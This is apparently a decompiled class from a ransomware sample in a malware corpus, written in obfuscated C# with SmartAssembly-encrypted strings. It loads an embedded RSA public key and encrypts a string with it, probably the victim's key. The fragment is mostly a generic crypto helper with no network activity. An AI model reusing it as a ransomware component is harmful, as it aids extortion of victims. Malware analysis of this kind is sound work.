// Decompiled with JetBrains decompiler
// Type: gtzdezosLTmcL.NeZlkozbreQfVxNZs
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B8444C5B-FCC9-4B9F-A06C-7304BA49E3C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-1d4db8733c5f11ee8fca530aeb4a91069de04b1af64cbe1fa3ae2d3572a6e554.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace gtzdezosLTmcL
{
  public static class NeZlkozbreQfVxNZs
  {
    private static bool dLrELnQOGveI;
    private static readonly string rsupKStexdxtmVG;
    [NonSerialized]
    internal static GetString \u0099;

    public static string EnuLFEKNQOdm([In] string obj0)
    {
      int SscurdyGujgGu = 0;
      string LwTxGyiKSoarFnF = NeZlkozbreQfVxNZs.\u0099(107359755);
      NeZlkozbreQfVxNZs.RpjFVcHyAOmL(NeZlkozbreQfVxNZs.rsupKStexdxtmVG, out SscurdyGujgGu, out LwTxGyiKSoarFnF);
      return Convert.ToBase64String(NeZlkozbreQfVxNZs.EOSFoDLAZw(Encoding.UTF8.GetBytes(obj0), SscurdyGujgGu, LwTxGyiKSoarFnF));
    }

    private static byte[] EOSFoDLAZw([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(NeZlkozbreQfVxNZs.\u0099(107368990), NeZlkozbreQfVxNZs.\u0099(107369001));
      int num = NeZlkozbreQfVxNZs.oCAhumgrLwAUlFR(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(NeZlkozbreQfVxNZs.\u0099(107368960), (object) num), NeZlkozbreQfVxNZs.\u0099(107369001));
      if (!NeZlkozbreQfVxNZs.jJIFTHGNvNsyh(obj1))
        throw new ArgumentException(NeZlkozbreQfVxNZs.\u0099(107368923), NeZlkozbreQfVxNZs.\u0099(107368382));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(NeZlkozbreQfVxNZs.\u0099(107368401), NeZlkozbreQfVxNZs.\u0099(107368372));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, NeZlkozbreQfVxNZs.dLrELnQOGveI);
      }
    }

    private static int oCAhumgrLwAUlFR([In] int obj0) => NeZlkozbreQfVxNZs.dLrELnQOGveI ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool jJIFTHGNvNsyh([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void RpjFVcHyAOmL(
      string OQyltiBcIKV,
      out int SscurdyGujgGu,
      out string LwTxGyiKSoarFnF)
    {
      SscurdyGujgGu = 0;
      LwTxGyiKSoarFnF = NeZlkozbreQfVxNZs.\u0099(107359755);
      if (OQyltiBcIKV == null || OQyltiBcIKV.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(OQyltiBcIKV));
      if (!str.Contains(NeZlkozbreQfVxNZs.\u0099(107368323)))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        SscurdyGujgGu = int.Parse(strArray[0]);
        LwTxGyiKSoarFnF = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }

    static NeZlkozbreQfVxNZs()
    {
      Strings.CreateGetStringDelegate(typeof (NeZlkozbreQfVxNZs));
      NeZlkozbreQfVxNZs.dLrELnQOGveI = false;
      NeZlkozbreQfVxNZs.rsupKStexdxtmVG = NeZlkozbreQfVxNZs.\u0099(107368318);
    }
  }
}
